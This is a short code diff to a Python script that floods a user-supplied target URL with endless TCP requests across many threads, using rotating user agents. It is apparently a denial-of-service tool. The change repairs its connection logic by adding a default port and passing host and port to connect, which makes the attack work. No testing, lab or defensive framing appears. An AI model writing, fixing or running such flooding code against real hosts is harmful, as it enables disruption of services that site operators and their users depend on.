@@ -44,6 +44,7 @@ url = input("Enter the target URL: ") # Change this to the target URL
 # Parse the url and get the host and port
 parsed_url = urllib.parse.urlparse(url)
 host = parsed_url.hostname
+port = parsed_url.port or 80 # Default to 80 if no port is specified
 
 # Define the number of threads to use
 threads = int(input("Enter the number of threads: ")) # Change this to the number of threads
@@ -107,7 +108,7 @@ user_agents = [
 def attack():
     # Create a socket object with TCP protocol and connect to the target host and port
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host))
+    s.connect((host, port))
 
 # Generate a random user agent from the list and a random payload with the user agent
     user_agent = random.choice(user_agents)
@@ -117,7 +118,7 @@ def attack():
     while True:
         # Send the payload to the target and print a success message
         s.send(payload)
-        print(f"Sent request to {host} with user agent {user_agent}")
+        print(f"Sent request to {host}:{port} with user agent {user_agent}")
 
 # Create a loop to launch threads for sending requests
 for i in range(threads):
